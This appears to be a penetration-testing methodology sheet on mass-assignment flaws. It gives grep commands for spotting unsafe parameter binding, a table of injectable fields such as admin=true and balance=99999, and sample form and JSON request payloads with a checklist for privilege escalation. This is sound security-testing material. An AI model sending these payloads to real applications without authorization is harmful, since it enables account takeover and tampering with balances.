# Web Mass Assignment Methodology

## 1. What Is Mass Assignment?

Web frameworks automatically bind HTTP request parameters to model object properties. If the application doesn't whitelist allowed fields, attackers can inject extra fields to modify unintended properties (privilege escalation, balance manipulation, etc.).

**Affected Frameworks**: Rails, Django, Express/Node.js, Laravel, Spring Boot, ASP.NET MVC

---

## 2. Common Injectable Fields

| Field | Effect |
|-------|--------|
| `admin=true` | Elevate to admin |
| `role=admin` | Change role |
| `is_admin=true` | Admin flag |
| `confirmed=true` | Bypass email verification |
| `verified=true` | Skip verification |
| `balance=99999` | Modify account balance |
| `credits=99999` | Add credits |
| `is_active=true` | Activate disabled account |
| `approved=true` | Auto-approve account |

---

## 3. Detection

### Source Code Grep (if available)
```bash
# Python/Django
grep -r "request.form" .
grep -r "request.data" .
grep -r "request.json" .

# Ruby/Rails
grep -r "params\[:" .
grep -r "params.permit" .  # If present → whitelist exists (safer)
grep -r "params.require" .

# Node/Express
grep -r "req.body" .

# PHP/Laravel
grep -rn "\$request->all()" .
grep -rn "\$request->input(" .
```

### Black-Box Testing
- [ ] Intercept registration/update request in Burp
- [ ] Note the normal parameters
- [ ] Add extra parameters and re-send:

### Form Data Injection
```
POST /register HTTP/1.1

username=test&password=test123&email=test@test.com&admin=true&role=admin&confirmed=true
```

### JSON Body Injection
```json
{
  "username": "test",
  "password": "test123",
  "email": "test@test.com",
  "admin": true,
  "role": "admin",
  "is_admin": true,
  "confirmed": true
}
```

### Nested Keys (Ruby/Rails style)
```
user[admin]=true
user[role]=admin
user[is_admin]=1
```

---

## 4. Methodology

- [ ] Register a normal account → note all parameters sent
- [ ] Look at response — does it include fields not in request? (e.g., `role: "user"`)
- [ ] Re-register with extra fields: `admin=true`, `role=admin`
- [ ] Check if privileges changed
- [ ] Try updating profile with extra fields (PUT/PATCH requests)
- [ ] Try both form-encoded and JSON content types

---

## 5. Decision Tree

```
Registration / Profile Update Form
├── Intercept request in Burp
├── Check response for hidden fields (role, admin, verified)
├── Add extra params: admin=true, role=admin, confirmed=true
│   ├── JSON body: {"admin": true, "role": "admin"}
│   ├── Form data: admin=true&role=admin
│   └── Nested: user[admin]=true
├── Check if account has elevated privileges
└── Try on profile update (PUT/PATCH) too
```
